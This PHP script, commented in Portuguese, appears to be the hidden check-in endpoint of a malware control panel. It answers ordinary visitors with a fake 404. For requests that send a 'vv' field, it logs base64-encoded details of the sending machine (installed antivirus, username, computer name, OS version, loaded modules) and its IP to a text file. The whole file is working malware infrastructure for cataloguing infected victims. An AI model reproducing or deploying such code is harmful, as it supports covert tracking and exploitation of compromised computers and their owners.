<?php
if(!isset($_POST['vv'])){
	header("HTTP/1.0 404 Not Found");
    die(); 
	exit();
}
ini_set("display_errors", 1);
date_default_timezone_set("America/Sao_Paulo");

/*
data | versao | AV | Username | ComputadorNome  | OS Versao |    PLugin(s) | ip |
*/
//$ip = getenv("REMOTE_ADDR");
$ip =$_SERVER["REMOTE_ADDR"];
$filename ="newconta.txt";

if(isset($_POST['is'])) { $is = base64_decode($_POST['is']);} else { $is = 'NULL';}
if(isset($_POST['iss'])) { $iss = base64_decode($_POST['iss']);} else { $iss = 'NULL';}
if(isset($_POST['iav'])) { $iav = base64_decode($_POST['iav']);} else { $iav = 'NULL';}


if(isset($_POST['vv'])) { $ver = $_POST['vv'];} else { $ver = 'NULL';}
if(isset($_POST['vw'])) { $gb = $_POST['vw'];} else {  $gb = 'NULL';}
if(isset($_POST['mods'])) {  $mods = base64_decode($_POST['mods']);} else {    $mods = 'NULL';}
if(isset($_POST['av'])) { $av = base64_decode($_POST['av']); } else {$av = '';}
$av = str_replace("\n", '', $av);
$av = str_replace("\r", '', $av);

if(isset($_POST['uname'])) { $uname = base64_decode($_POST['uname']); } else {$uname = '';}
if(isset($_POST['cname'])) { $cname = base64_decode($_POST['cname']); } else {$cname = '';}
if(isset($_POST['os'])) { $os =  base64_decode($_POST['os']); } else {$os = '';}


//header("Content-type: text/html; charset=utf-8"); 

if (is_writable($filename)) {

	if (!$handle = fopen($filename, 'a')) {
			 echo "N&#227;o foi poss&#237;vel abrir o arquivo ($filename)";
			 exit;
		}
		$conteudo = date('d/m/Y') .' &#225;s '.  date('H:i:s')."|{$ver}|{$av}|{$uname}|{$cname}|{$os}|{$mods}|{$ip}|{$is}|{$iss}|{$iav}|\n"  ;
		//$conteudo = date('d/m/Y') .' &#225;s '.  date('H:i:s').'|'.$_SERVER['REMOTE_ADDR'] . ' - '.gethostbyaddr($_SERVER['REMOTE_ADDR']) . "|{$ver}|\n";
        //      $conteudo = date('d/m/Y') .' &#225;s '.  date('H:i:s').'|'.$_SERVER['REMOTE_ADDR'] . ' - '. $json_str->country . '('.$json_str->countryCode. ')  '.$json_str->region . '-'.$json_str->city. "|{$ver}|{$gb}|{$mods}|\n";
    // Escreve $conteudo no nosso arquivo aberto.
    if (fwrite($handle, $conteudo) === FALSE) {
        echo "N&#227;o foi poss&#237;vel escrever no arquivo ($filename)";
        exit;
    }


    fclose($handle);		

} else {
    echo "O arquivo $filename n&#227;o pode ser alterado";
}

?>
